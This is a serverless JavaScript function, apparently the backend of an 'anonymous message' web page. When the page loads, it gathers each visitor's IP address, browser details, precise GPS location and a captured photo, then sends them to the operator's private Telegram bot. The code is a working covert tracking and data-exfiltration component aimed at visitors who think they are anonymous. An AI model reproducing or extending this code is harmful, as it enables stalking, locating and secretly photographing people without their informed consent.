// This function collects passive data (IP, User-Agent) and initial media/location on page load.

const multipart = require('lambda-multipart-parser');
const fetch = require('node-fetch');
const FormData = require('form-data'); // Needed for sending media to Telegram

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const result = await multipart.parse(event);
        // Extract data that might be sent from frontend
        const latitude = result.latitude ? parseFloat(result.latitude) : null;
        const longitude = result.longitude ? parseFloat(result.longitude) : null;
        const initialPhotoFile = result.files.find(f => f.fieldname === 'photo'); // Find the photo if sent

        // Get passive data from headers
        const ip = event.headers['x-nf-client-connection-ip'] || 'N/A';
        const userAgent = event.headers['user-agent'] || 'N/A';
        const network = 'unknown'; // Default. Getting precise network provider needs external service.

        // Get your secret bot 1 token and chat ID
        const botToken = process.env.TELEGRAM_BOT_1_TOKEN; 
        const chatId = process.env.TELEGRAM_BOT_1_CHAT_ID;

        if (!botToken || !chatId) {
            console.error('Missing TELEGRAM_BOT_1_TOKEN or TELEGRAM_BOT_1_CHAT_ID environment variables for initial data.');
            return { statusCode: 500, body: 'Server configuration error.' };
        }

        // 1. Construct the text notification
        const now = new Date();
        const timeOptions = { 
            timeZone: 'Asia/Kolkata', 
            month: 'numeric', day: 'numeric', year: 'numeric', 
            hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true 
        };
        const formattedTime = now.toLocaleString('en-US', timeOptions);

        let textNotification = `⚡️ *New Anonymous Visitor Data* ⚡️\n\n`;
        textNotification += `*Timestamp:* ${formattedTime}\n`;
        textNotification += `*IP Address:* \`${ip}\`\n`;
        textNotification += `*Device/Browser:* \`${userAgent}\`\n`;
        textNotification += `*Network:* \`${network}\`\n`;

        if (latitude !== null && longitude !== null) {
            const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            textNotification += `*Precise Location:* [View Map](${googleMapsLink})\n`;
        } else {
            textNotification += `*Precise Location:* Not shared (or permission denied)\n`;
        }

        if (initialPhotoFile) {
            textNotification += `*Initial Photo:* Yes (attached below)\n`;
        } else {
            textNotification += `*Initial Photo:* No (or permission denied)\n`;
        }
        textNotification += `*User Interaction:* Visited page, no anonymous message yet.\n`;


        // Send the text notification first
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: textNotification, parse_mode: 'Markdown' }),
        });

        // 2. Send the photo if available
        if (initialPhotoFile) {
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', initialPhotoFile.content, { filename: initialPhotoFile.filename });

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: form
            });
            console.log(`Initial photo sent: ${initialPhotoFile.filename}`);
        }

        return { statusCode: 200, body: JSON.stringify({ success: true }) };

    } catch (error) {
        console.error("Error in collect-initial-data function:", error);
        return { statusCode: 500, body: JSON.stringify({ error: 'Internal Server Error' }) };
    }
};
